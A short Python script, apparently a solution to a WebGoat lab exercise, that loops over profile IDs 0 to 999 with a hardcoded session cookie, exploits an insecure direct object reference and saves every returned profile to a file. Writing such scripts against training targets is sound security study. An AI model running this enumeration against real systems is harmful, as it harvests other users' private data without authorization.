import requests

base_url = "http://10.1.121.141:8080/WebGoat/IDOR/profile/"
cookie = {"JSESSIONID":"CA022FA656A2740E47503559256EB92D"}
file_name = "result.txt"

if __name__ == "__main__":
    for i in range(0, 1000):
        url = base_url + str(i)
        r = requests.get(url, cookies=cookie)
        if (r.status_code == 200):
            with open(file_name, "a") as file:
                file.write(r.text)
        # print(r.content)